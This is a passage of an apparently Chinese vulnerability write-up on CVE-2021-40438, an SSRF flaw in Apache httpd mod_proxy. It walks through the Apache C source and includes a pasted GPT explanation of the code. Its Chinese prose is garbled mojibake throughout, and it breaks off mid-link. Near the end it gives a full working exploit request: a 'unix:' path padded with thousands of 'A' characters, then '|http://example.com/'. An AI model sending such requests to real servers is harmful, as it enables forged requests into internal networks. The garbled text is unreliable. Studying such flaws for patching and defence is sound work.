mod_proxy_fcgi ç”¨äºåä»£åç«¯æ˜¯fastcgiåè®®çš„æœåŠ¡ï¼Œæ¯”å¦‚php-fpm mod_proxy_http ç”¨äºåä»£åç«¯æ˜¯httpã€httpsåè®®çš„æœåŠ¡ mod_proxy_uwsgi ç”¨äºåä»£åç«¯æ˜¯uwsgiåè®®çš„æœåŠ¡ï¼Œä¸»è¦é’ˆå¯¹uWSGI mod_proxy_ajp ç”¨äºåä»£åç«¯æ˜¯ajpåè®®çš„æœåŠ¡ï¼Œä¸»è¦é’ˆå¯¹Tomcat mod_proxy_ftp ç”¨äºåä»£åç«¯æ˜¯ftpåè®®çš„æœåŠ¡ é™¤å»mod_proxy_fcgiç”¨äºåä»£PHPï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨Node.jsã€Pythonç­‰è„šæœ¬è¯­è¨€ç¼–å†™çš„åº”ç”¨ä¹Ÿå¸¸å¸¸ä¼šä½¿ç”¨mod_proxy_httpä½œä¸ºä¸€å±‚åä»£æœåŠ¡å™¨ï¼Œè¿™æ ·ä¸­é—´å±‚å¯ä»¥åšACLã€é™æ€æ–‡ä»¶æœåŠ¡ç­‰ã€‚ è¿™æ¬¡çš„SSRFæ¼æ´æ˜¯å‡ºåœ¨mod_proxyè¿™ä¸ªæ¨¡å—ä¸­çš„ï¼Œæˆ‘ä»¬å°±æ¥ä»ä»£ç çš„å±‚é¢åˆ†æä¸€ä¸‹å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼Œç©¶ç«Ÿå½±å“æœ‰å¤šå¤§ã€‚ 0x03 æ¼æ´åŸç†åˆ†æ ã€ŠBuilding a POC for CVE-2021-40438ã€‹è¿™ç¯‡æ–‡ç« ä¸­æåˆ°äº†è¿™ä¸ªæ¼æ´çš„å¤ç°æ–¹æ³•ï¼šå½“ç›®æ ‡ç¯å¢ƒä½¿ç”¨äº†mod_proxyåšåå‘ä»£ç†ï¼Œæ¯”å¦‚ProxyPass / \"http://localhost:8000/\"ï¼Œæ­¤æ—¶é€šè¿‡è¯·æ±‚http://target/?unix:{'A'*5000}|http://example.com/å³å¯å‘http://example.comå‘é€è¯·æ±‚ï¼Œé€ æˆä¸€ä¸ªSSRFæ”»å‡»ã€‚ è¿™é‡Œé¢ï¼ŒApacheä»£ç ä¸­çŠ¯å¾—é”™è¯¯æ˜¯åœ¨modules/proxy/proxy_util.cçš„fix_uds_filenameå‡½æ•°ï¼š /* * In the case of the reverse proxy, we need to see if we * were passed a UDS url (eg: from mod_proxy) and adjust uds_path * as required. */ static void fix_uds_filename(request_rec *r, char **url) { char *ptr, *ptr2; if (!r || !r-&gt;filename) return; if (!strncmp(r-&gt;filename, \"proxy:\", 6) &amp;&amp; (ptr2 = ap_strcasestr(r-&gt;filename, \"unix:\")) &amp;&amp; (ptr = ap_strchr(ptr2, '|'))) { apr_uri_t urisock; apr_status_t rv; *ptr = '\\0'; rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock); if (rv == APR_SUCCESS) { char *rurl = ptr+1; char *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path); apr_table_setn(r-&gt;notes, \"uds_path\", sockpath); *url = apr_pstrdup(r-&gt;pool, rurl); /* so we get the scheme for the uds */ /* r-&gt;filename starts w/ \"proxy:\", so add after that */ memmove(r-&gt;filename+6, rurl, strlen(rurl)+1); ap_log_rerror(APLOG_MARK, APLOG_TRACE2, 0, r, \"*: rewrite of url due to UDS(%s): %s (%s)\", sockpath, *url, r-&gt;filename); } else { *ptr = '|'; } } } Apacheåœ¨é…ç½®åä»£çš„åç«¯æœåŠ¡å™¨æ—¶ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š ç›´æ¥ä½¿ç”¨æŸä¸ªåè®®åä»£åˆ°æŸä¸ªIPå’Œç«¯å£ï¼Œæ¯”å¦‚ProxyPass / \"http://localhost:8080\" ä½¿ç”¨æŸä¸ªåè®®åä»£åˆ°unixå¥—æ¥å­—ï¼Œæ¯”å¦‚ProxyPass / \"unix:/var/run/www.sock|http://localhost:8080/\" ç¬¬ä¸€ç§æƒ…å†µæ¯”è¾ƒå¥½ç†è§£ï¼Œç¬¬äºŒç§æƒ…å†µçš„è®¾è®¡æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆå¥½ï¼Œç›¸å½“äºè®©ç”¨æˆ·å¯ä»¥ä½¿ç”¨ä¸€ä¸ªApacheè‡ªåˆ›çš„å†™æ³•æ¥é…ç½®åç«¯åœ°å€ã€‚é‚£ä¹ˆè¿™æ—¶å€™å°±ä¼šæ¶‰åŠåˆ°parseçš„è¿‡ç¨‹ï¼Œéœ€è¦å°†è¿™ç§è‡ªåˆ›çš„è¯­æ³•è½¬æ¢æˆèƒ½å…¼å®¹æ­£å¸¸socketè¿æ¥çš„ç»“æ„ï¼Œè€Œfix_uds_filenameå‡½æ•°å°±æ˜¯åšè¿™ä¸ªäº‹æƒ…çš„ã€‚ ä½¿ç”¨å­—ç¬¦ä¸²æ–‡æ³•æ¥è¡¨ç¤ºå¤šç§å«ä¹‰çš„æ–¹å¼é€šå¸¸æš—è—ä¸€äº›æ¼æ´ï¼Œæ¯”å¦‚è¿™é‡Œï¼Œè¿›å…¥è¿™ä¸ªifè¯­å¥éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š r-&gt;filenameçš„å‰6ä¸ªå­—ç¬¦ç­‰äºproxy: r-&gt;filenameçš„å­—ç¬¦ä¸²ä¸­å«æœ‰å…³é”®å­—unix: unix:å…³é”®å­—åçš„éƒ¨åˆ†å«æœ‰å­—ç¬¦| å½“æ»¡è¶³è¿™ä¸‰ä¸ªæ¡ä»¶åï¼Œå°†unix:åé¢çš„å†…å®¹è¿›è¡Œè§£æï¼Œè®¾ç½®æˆuds_pathçš„å€¼ï¼›å°†å­—ç¬¦|åé¢çš„å†…å®¹ï¼Œè®¾ç½®æˆrurlçš„å€¼ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå‰é¢ä»‹ç»ä¸­çš„ProxyPass / \"unix:/var/run/www.sock|http://localhost:8080/\"ï¼Œåœ¨è§£æå®Œæˆåï¼Œuds_pathçš„å€¼ç­‰äº/var/run/www.sockï¼Œrurlçš„å€¼ç­‰äºhttp://localhost:8080/ã€‚ è¿™é‡Œä¸Šä¸€ä¸ªGPTè§£é‡Šï¼š è¿™æ®µä»£ç æ˜¯ C è¯­è¨€ä»£ç ï¼Œç”¨äº Apache HTTP æœåŠ¡å™¨çš„æ¨¡å—å¼€å‘ã€‚è¯¥ä»£ç ä½äºä¸€ä¸ªå‡½æ•° `fix_uds_filename` ä¸­ï¼Œç”¨äºå¤„ç†åå‘ä»£ç†ï¼ˆreverse proxyï¼‰ä¸­çš„è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†ä¼ é€’äº† UDSï¼ˆUnix Domain Socketï¼‰URL çš„æƒ…å†µä¸‹ã€‚ ä»¥ä¸‹æ˜¯å¯¹è¯¥ä»£ç çš„åˆ†æï¼š 1. `fix_uds_filename` å‡½æ•°æ˜¯ä¸€ä¸ªé™æ€å‡½æ•°ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼š`request_rec *r` å’Œ `char **url`ã€‚`request_rec` æ˜¯ Apache HTTP æœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶çš„æ ¸å¿ƒæ•°æ®ç»“æ„ï¼Œè€Œ `char **url` æ˜¯ä¸€ä¸ªæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆï¼Œç”¨äºä¼ é€’ URLã€‚ 2. å‡½æ•°å¼€å§‹çš„æ³¨é‡Šè§£é‡Šäº†å®ƒçš„ç›®çš„ï¼Œå³åœ¨åå‘ä»£ç†ä¸­ï¼Œæ£€æŸ¥æ˜¯å¦ä¼ é€’äº† UDS URLï¼ˆä¾‹å¦‚æ¥è‡ª mod_proxy æ¨¡å—ï¼‰ï¼Œå¹¶æ ¹æ®éœ€è¦è°ƒæ•´ UDS è·¯å¾„ã€‚ 3. æ¥ä¸‹æ¥ï¼Œä»£ç å¯¹è¾“å…¥å‚æ•°è¿›è¡Œäº†ä¸€äº›åŸºæœ¬çš„æœ‰æ•ˆæ€§æ£€æŸ¥ï¼Œç¡®ä¿ `r` å’Œ `r-&gt;filename` ä¸ä¸ºç©ºã€‚å¦‚æœä¸ºç©ºï¼Œå‡½æ•°å°±ä¼šç›´æ¥è¿”å›ï¼Œä¸æ‰§è¡Œåç»­æ“ä½œã€‚ 4. æ¥ä¸‹æ¥ï¼Œä»£ç æ£€æŸ¥ `r-&gt;filename` æ˜¯å¦ä»¥ \"proxy:\" å¼€å¤´ï¼Œå¹¶ä¸”æ˜¯å¦åŒ…å« \"unix:\" å’Œ \"|\"ã€‚è¿™äº›æ¡ä»¶ç”¨äºè¯†åˆ«ä¼ é€’çš„ UDS URLã€‚ 5. å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œä»£ç ä¼šä½¿ç”¨ Apache çš„å‡½æ•° `ap_strcasestr` å’Œ `ap_strchr` æ¥åˆ†æ URLï¼Œå¹¶è§£æå…¶ä¸­çš„ UDS è·¯å¾„ã€‚ 6. ä¸€æ—¦æˆåŠŸè§£æ UDS è·¯å¾„ï¼Œä»£ç ä¼šå°†å…¶å­˜å‚¨åœ¨ `apr_table_t` æ•°æ®ç»“æ„ä¸­çš„ \"uds_path\" é”®ä¸‹ï¼Œå¹¶å°† UDS URL çš„å‰©ä½™éƒ¨åˆ†å­˜å‚¨åœ¨ `url` æŒ‡é’ˆæ‰€æŒ‡å‘çš„ä½ç½®ã€‚ 7. æ¥ä¸‹æ¥ï¼Œä»£ç æ›´æ–° `r-&gt;filename`ï¼Œå°† \"proxy:\" åé¢çš„éƒ¨åˆ†æ›¿æ¢ä¸ºè§£æå‡ºçš„ UDS URLã€‚ 8. æœ€åï¼Œä»£ç ä½¿ç”¨ `ap_log_rerror` å‡½æ•°è®°å½•ä¸€æ¡æ—¥å¿—ï¼ŒæŒ‡ç¤ºå·²ç»å› ä¸º UDS URL çš„å­˜åœ¨è€Œé‡å†™äº† URLã€‚ æ€»ä¹‹ï¼Œè¿™æ®µä»£ç çš„ä¸»è¦ç›®çš„æ˜¯åœ¨å¤„ç†åå‘ä»£ç†è¯·æ±‚æ—¶ï¼Œæ£€æŸ¥ä¼ é€’çš„ URL æ˜¯å¦åŒ…å« UDS éƒ¨åˆ†ï¼Œå¦‚æœåŒ…å«ï¼Œåˆ™è§£æå‡º UDS è·¯å¾„ï¼Œå¹¶è¿›è¡Œä¸€äº›å¿…è¦çš„æ›´æ–°å’Œæ—¥å¿—è®°å½•ã€‚è¿™æœ‰åŠ©äºåœ¨åå‘ä»£ç†ä¸­æ­£ç¡®å¤„ç†ä½¿ç”¨ Unix åŸŸå¥—æ¥å­—çš„æƒ…å†µã€‚ è¿™é‡Œæˆ‘ä»¬å…ˆææ¸…æ¥šä»£ç æ˜¯å¹²ä»€ä¹ˆçš„å³å¯ã€‚ çœ‹åˆ°è¿™é‡Œå…¶å®éƒ½æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šä¼šæ€è€ƒï¼Œr-&gt;filenameæ˜¯ä»å“ªæ¥çš„ï¼Œç”¨æˆ·å¯æ§å—ï¼Œä¸ºä»€ä¹ˆï¼Ÿ è¿™æ—¶å°±è¦è¯´åˆ°å¦ä¸€ä¸ªå‡½æ•°ï¼Œproxy_hook_canon_handlerï¼Œè¿™ä¸ªå‡½æ•°ç”¨äºæ³¨å†Œcanon handlerï¼Œæ¯”å¦‚ï¼š ![image-20230916154849448](Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916154849448.png) å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸€ä¸ªmod_proxy_xxxéƒ½ä¼šæ³¨å†Œä¸€ä¸ªè‡ªå·±çš„canon handlerï¼Œcanon handlerä¼šåœ¨åä»£çš„æ—¶å€™è¢«è°ƒç”¨ï¼Œç”¨äºå‘Šè¯‰Apacheä¸»ç¨‹åºå®ƒåº”è¯¥æŠŠè¿™ä¸ªè¯·æ±‚äº¤ç»™å“ªä¸ªå¤„ç†æ–¹æ³•æ¥å¤„ç†ã€‚ æ¯”å¦‚ï¼Œæˆ‘ä»¬çœ‹åˆ°mod_proxy_httpçš„proxy_http_canonå‡½æ•°ï¼š static int proxy_http_canon(request_rec *r, char *url) { // ... // first part if (strncasecmp(url, \"http:\", 5) == 0) { url += 5; scheme = \"http\"; } else if (strncasecmp(url, \"https:\", 6) == 0) { url += 6; scheme = \"https\"; } else { return DECLINED; } port = def_port = ap_proxy_port_of_scheme(scheme); // second part ap_proxy_canon_netloc(r-&gt;pool, &amp;url, NULL, NULL, &amp;host, &amp;port); switch (r-&gt;proxyreq) { default: /* wtf are we doing here? */ case PROXYREQ_REVERSE: if (apr_table_get(r-&gt;notes, \"proxy-nocanon\")) { path = url; /* this is the raw path */ } else { path = ap_proxy_canonenc(r-&gt;pool, url, strlen(url), enc_path, 0, r-&gt;proxyreq); search = r-&gt;args; } break; case PROXYREQ_PROXY: path = url; break; } if (path == NULL) return HTTP_BAD_REQUEST; if (port != def_port) apr_snprintf(sport, sizeof(sport), \":%d\", port); else sport[0] = '\\0'; if (ap_strchr_c(host, ':')) { /* if literal IPv6 address */ host = apr_pstrcat(r-&gt;pool, \"[\", host, \"]\", NULL); } // fourth part r-&gt;filename = apr_pstrcat(r-&gt;pool, \"proxy:\", scheme, \"://\", host, sport, \"/\", path, (search) ? \"?\" : \"\", (search) ? search : \"\", NULL); return OK; } è¿™ä¸ªå‡½æ•°ä¸­æœ‰ä¸‰ä¸ªä¸»è¦çš„éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ£€æŸ¥äº†é…ç½®ä¸­çš„urlçš„å¼€å¤´æ˜¯ä¸æ˜¯http:æˆ–https:ï¼Œå¦‚æœä¸æ˜¯ï¼Œè¯´æ˜è¿™ä¸ªè¯·æ±‚ä¸è¯¥ç”±mod_proxy_httpæ¨¡å—å¤„ç†ï¼Œåç»­çš„è¿‡ç¨‹è·³è¿‡ï¼›ç¬¬äºŒéƒ¨åˆ†ï¼Œç”¨å„ç§æ–¹å¼è·å–åˆ°schemeã€hostã€portã€pathã€searchç­‰å‡ ä¸ªURLçš„ç»„æˆå˜é‡ï¼›ç¬¬ä¸‰éƒ¨åˆ†ï¼Œæ‹¼æ¥proxy:ã€schemeã€://ã€hostã€sportã€/ã€pathã€searchï¼Œæˆä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œèµ‹å€¼ç»™r-&gt;filenameã€‚ è¿™é‡Œé¢ï¼Œschemeã€hostã€portæ¥è‡ªäºé…ç½®æ–‡ä»¶ä¸­é…ç½®çš„ProxyPassï¼Œè€Œpathã€searchæ¥è‡ªäºç”¨æˆ·å‘é€çš„æ•°æ®åŒ…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œr-&gt;filenameä¸­çš„ååŠéƒ¨åˆ†æ˜¯ç”¨æˆ·å¯æ§çš„ã€‚ é‚£æˆ‘ä»¬å›çœ‹å‰é¢çš„fix_uds_filenameå‡½æ•°ï¼Œå®ƒåœ¨r-&gt;filenameä¸­æŸ¥æ‰¾å…³é”®å­—unix:ï¼Œå¹¶å°†è¿™ä¸ªå…³é”®å­—åé¢ç›´åˆ°|çš„éƒ¨åˆ†ä½œä¸ºunixå¥—æ¥å­—åœ°å€ï¼Œè€Œå°†|åé¢çš„éƒ¨åˆ†ä½œä¸ºåä»£çš„åç«¯åœ°å€ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯·æ±‚çš„pathæˆ–è€…searchæ¥æ§åˆ¶è¿™ä¸¤ä¸ªéƒ¨åˆ†ï¼Œæ§åˆ¶äº†åä»£çš„åç«¯åœ°å€ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œä¼šå‡ºç°SSRFçš„åŸå› ã€‚ 0x04 é™åˆ¶ç»•è¿‡ å½“ç„¶ï¼Œè¿™é‡Œé¢æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯Apacheåœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå› ä¸ºè¯†åˆ«åˆ°äº†unixå¥—æ¥å­—ï¼Œæ‰€ä»¥ä¼šæŠŠç”¨æˆ·è¯·æ±‚å‘é€ç»™è¿™ä¸ªæœ¬åœ°æ–‡ä»¶å¥—æ¥å­—ï¼Œè€Œä¸æ˜¯åç«¯URLã€‚ å¯ä»¥æ¥åšä¸ªæµ‹è¯•ï¼Œæˆ‘ä»¬å‘é€è¿™æ ·ä¸€ä¸ªè¯·æ±‚ï¼š GET /?unix:/var/run/test.sock|http://example.com/ HTTP/1.1 ... æ­¤æ—¶ä¼šå¾—åˆ°ä¸€ä¸ª503é”™è¯¯ï¼Œé”™è¯¯æ—¥å¿—ä¼šåé¦ˆè¿™æ ·çš„ç»“æœï¼š [Mon Oct 18 00:14:38.634795 2021] [proxy:error] [pid 782180:tid 140737306797824] (2)No such file or directory: AH02454: HTTP: attempt to connect to Unix domain socket /var/run/test.sock (192.168.1.1) failed [Mon Oct 18 00:14:38.634875 2021] [proxy_http:error] [pid 782180:tid 140737306797824] [client 192.168.1.142:59696] AH01114: HTTP: failed to make connection to backend: httpd-UDS æ‰¾ä¸åˆ°unixå¥—æ¥å­—/var/run/test.sockï¼Œè¿™æ˜¯å½“ç„¶ã€‚ æˆ‘ä»¬ä¸èƒ½è®©ä»–æŠŠè¯·æ±‚å‘é€åˆ°unixå¥—æ¥å­—ä¸Šï¼Œè€Œæ˜¯å‘é€ç»™æˆ‘ä»¬éœ€è¦çš„|åé¢çš„åœ°å€ã€‚ å›½å¤–é‚£ä½ä½œè€…ç»™å‡ºäº†ä¸€ä¸ªéå¸¸å·§å¦™çš„æ–¹æ³•ï¼Œåœ¨fix_uds_filenameå‡½æ•°ä¸­ï¼Œunixå¥—æ¥å­—çš„åœ°å€æ¥è‡ªäºä¸‹é¢è¿™ä¸¤è¡Œä»£ç ï¼š char *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path); apr_table_setn(r-&gt;notes, \"uds_path\", sockpath); å¦‚æœè¿™é‡Œap_runtime_dir_relativeå‡½æ•°è¿”å›å€¼æ˜¯nullï¼Œåˆ™åé¢è·å–uds_pathæ—¶å°†ä¸ä¼šä½¿ç”¨unixå¥—æ¥å­—åœ°å€ï¼Œè€Œå˜æˆæ™®é€šçš„TCPè¿æ¥ï¼š uds_path = (*worker-&gt;s-&gt;uds_path ? worker-&gt;s-&gt;uds_path : apr_table_get(r-&gt;notes, \"uds_path\")); if (uds_path) { if (conn-&gt;uds_path == NULL) { /* use (*conn)-&gt;pool instead of worker-&gt;cp-&gt;pool to match lifetime */ conn-&gt;uds_path = apr_pstrdup(conn-&gt;pool, uds_path); } // ... conn-&gt;hostname = \"httpd-UDS\"; conn-&gt;port = 0; } else { // ... conn-&gt;hostname = apr_pstrdup(conn-&gt;pool, uri-&gt;hostname); conn-&gt;port = uri-&gt;port; // ... } é‚£ä¹ˆå¦‚ä½•è®©ap_runtime_dir_relativeçš„è¿”å›å€¼æ˜¯nullï¼Ÿap_runtime_dir_relativeå‡½æ•°æœ€åå¼•ç”¨äº†apråº“ä¸­çš„apr_filepath_mergeå‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨å°±æ˜¯è·¯å¾„çš„joinï¼Œç”¨äºå¤„ç†ç›¸å¯¹è·¯å¾„ã€ç»å¯¹è·¯å¾„ã€../è¿æ¥ã€‚ è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå½“å¾…joinçš„ä¸¤æ®µè·¯å¾„é•¿åº¦+4å¤§äºAPR_PATH_MAXï¼Œä¹Ÿå°±æ˜¯4096çš„æ—¶å€™ï¼Œåˆ™å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªè·¯å¾„è¿‡é•¿çš„çŠ¶æ€ç ï¼Œå¯¼è‡´æœ€åunixå¥—æ¥å­—çš„å€¼æ˜¯nullï¼š rootlen = strlen(rootpath); maxlen = rootlen + strlen(addpath) + 4; /* 4 for slashes at start, after * root, and at end, plus trailing * null */ if (maxlen &gt; APR_PATH_MAX) { return APR_ENAMETOOLONG; } ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨unix:ä¸|ä¹‹é—´ä¼ å…¥å†…å®¹é•¿åº¦å¤§æ¦‚è¶…è¿‡4092çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½æ„é€ å‡ºuds_pathä¸ºnullçš„ç»“æœï¼Œè®©Apacheä¸å†å‘é€è¯·æ±‚ç»™unixå¥—æ¥å­—ã€‚ æœ€åï¼Œè¿™æ ·æ„é€ å‡ºçš„è¯·æ±‚æˆåŠŸè§¦å‘SSRFæ¼æ´ï¼š EXP GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1 Host: 192.168.1.162:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close ![image-20230916160123781](Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160123781.png) ![image-20230916161434812](Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF 